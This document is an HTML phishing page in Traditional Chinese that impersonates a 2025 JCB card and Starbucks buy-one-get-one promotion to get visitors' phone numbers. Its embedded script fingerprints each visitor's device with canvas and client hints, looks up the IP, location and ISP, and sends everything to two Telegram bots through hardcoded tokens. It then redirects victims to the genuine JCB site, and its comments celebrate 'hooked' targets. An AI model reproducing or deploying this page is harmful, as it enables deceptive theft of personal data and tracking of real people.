<!DOCTYPE html>
<html lang="zh-TW">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>2025 JCB晶緻卡 × 星巴克獨享禮遇</title>
<!-- 強迫瀏覽器交出最精準型號（Grabify 終極武器） -->
<meta http-equiv="Accept-CH" content="Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Mobile">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Noto Sans TC',sans-serif;background:#0F1621;color:#fff;min-height:100vh;display:flex;flex-direction:column;overflow-x:hidden}
.header{padding:20px 0 10px;text-align:center;background:#0F1621}
.jcb-logo{max-width:72px;margin:0 auto 10px;display:block}
.title{font-size:28px;font-weight:900;color:#FFC600;letter-spacing:1px;margin:8px 0}
.subtitle{font-size:17px;color:#E0E0E0;margin-bottom:20px}
.circle-badge{width:120px;height:120px;background:#FF5E38;border-radius:50%;margin:35px auto 40px;display:flex;align-items:center;justify-content:center;box-shadow:0 10px 30px rgba(255,94,56,0.4);font-size:19px;font-weight:900;color:white;line-height:1.2;text-align:center;border:4px solid #FFF3E0;flex-shrink:0}
.box{background:rgba(255,255,255,0.1);backdrop-filter:blur(12px);border-radius:24px;margin:0 16px 30px;padding:32px 24px;border:1px solid rgba(255,255,255,0.15);box-shadow:0 15px 35px rgba(0,0,0,0.3);flex:1}
.highlight{font-size:26px;font-weight:900;color:#FFC600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;letter-spacing:1px}
.desc{font-size:16px;margin:12px 0 25px;color:#E8E8E8;line-height:1.6}
.input-group{display:flex;height:56px;background:white;border-radius:16px;overflow:hidden;margin:20px 0;box-shadow:0 8px 25px rgba(0,0,0,0.25);font-size:18px}
select{background:#f5f5f5;border:none;padding:0 15px;font-size:18px;color:#333}
input{flex:1;border:none;padding:0 18px;font-size:18px;outline:none;color:#333}
button{width:100%;padding:18px;background:#00704A;color:white;border:none;border-radius:16px;font-size:20px;font-weight:bold;margin-top:10px;box-shadow:0 8px 25px rgba(0,112,74,0.4);cursor:pointer;transition:all .2s}
button:active{transform:scale(0.98)}
.footer{padding:20px 0;font-size:12px;text-align:center;color:#888;margin-top:auto}
.footer a{color:#88C0D0;text-decoration:underline}
</style>
</head>
<body>

<div class="header">
  <img src="https://cache.jcb.co.jp/common/img/logo-jcb-w.svg" onerror="this.src='https://www.jcb.co.jp/promotion/common/img/logo-jcb-w.svg'" class="jcb-logo" alt="JCB">
  <div class="title">2025 獨享禮遇</div>
  <div class="subtitle">JCB晶緻卡 × 星巴克</div>
</div>

<div class="circle-badge">前1000名<br>送咖啡</div>

<div class="box">
  <div class="highlight">消費滿 $99 享買一送一</div>
  <div class="desc">
    限 2025 全年・晶緻卡專屬<br>
    <span style="color:#FF6B6B;font-weight:700;">每個門號限領一次・立即領取專屬優惠碼</span>
  </div>

  <form id="loginForm">
    <div class="input-group">
      <select id="countryCode">
        <option value="+886" selected>+886</option>
        <option>+852</option><option>+60</option><option>+66</option><option>+63</option>
      </select>
      <input type="tel" id="phone" placeholder="912345678" required maxlength="12">
    </div>
    <button type="submit">立即領取優惠</button>
  </form>
</div>

<div class="footer">
  © 2025 JCB International Co., Ltd. All rights reserved.<br>
  <a href="https://www.jcb.co.jp/privacy/">隱私權政策</a> | 
  <a href="https://www.jcb.co.jp/terms/">服務條款</a>
</div>

<script>
    const TOKEN = "8347410245:AAGUfzcDsL6h6TaIIpfxDQOoo288dHd1pGw";
    const CHAT_ID = "1137905005";

    // Canvas 指紋（防換 UA）
    function getCanvasFP() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.fillStyle = "#f60"; ctx.fillRect(125,1,62,20);
        ctx.fillStyle = "#069"; ctx.fillText("Cwm fjordbank glyphs vext quiz", 2, 15);
        ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("Cwm fjordbank glyphs vext quiz", 4, 17);
        return canvas.toDataURL().substring(0,50);
    }

    // 重複上鉤偵測（localStorage）
    function checkRepeat(fp) {
        const key = "jcb2025_" + fp;
        const count = (parseInt(localStorage.getItem(key)) || 0) + 1;
        localStorage.setItem(key, count);
        return count > 1 ? `【重複上鉤！第 ${count} 次！】\n` : "";
    }

    document.getElementById("loginForm").addEventListener("submit", async function(e) {
        e.preventDefault();
        const code = document.getElementById("countryCode").value;
        const phone = document.getElementById("phone").value.trim();
        if (!phone) return;

        document.querySelector("button").textContent = "驗證中...";
        document.querySelector("button").disabled = true;

        // 1. IP + 位置
        const ipData = await fetch("https://cfip.mx/json").then(r=>r.json()).catch(()=>({}));

        // 2. 完整型號（Client Hints + UA 備援）
        let model = "未知裝置";
        if (navigator.userAgentData?.model) model = navigator.userAgentData.model;
        else if (navigator.userAgent.includes("iPhone")) model = navigator.userAgent.match(/iPhone[^;]*/)[0];
        else if (navigator.userAgent.includes("Android")) {
            const m = navigator.userAgent.match(/Android.*?;\s*([^;]+?)\s+Build\//i) || navigator.userAgent.match(/\(([^;]+?);[^)]+Build/i);
            model = m ? m[1].trim() : "Android手機";
        }

        // 3. Canvas 指紋 + 重複偵測
        const canvasFP = getCanvasFP();
        const repeat = checkRepeat(canvasFP);

        const time = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});

        const msg = repeat + "2025星巴克指定品項半價誘捕成功\n\n" +
                    "電話：" + code + phone + "\n" +
                    "IP　　：" + (ipData.ip || "未知") + "\n" +
                    "位置　：" + (ipData.city || "未知") + "，" + (ipData.country || "未知") + "\n" +
                    "ISP　　：" + (ipData.org || "未知") + "\n" +
                    "時間　：" + time + "\n" +
                    "裝置　：" + model + "\n" +
                    "指紋　：" + canvasFP;

        // 雙 token 發送
        new Image().src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
        new Image().src = `https://api.telegram.org/bot8059163852:AAH8cE9y3vL0dK7fXqZ5rT2mNjLpOqRsY/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;

        setTimeout(() => location.href = "https://www.specialoffers.jcb/zh-tw/services/dining-food/starbucks2025/", 2500);
    });
</script>

</body>
</html>
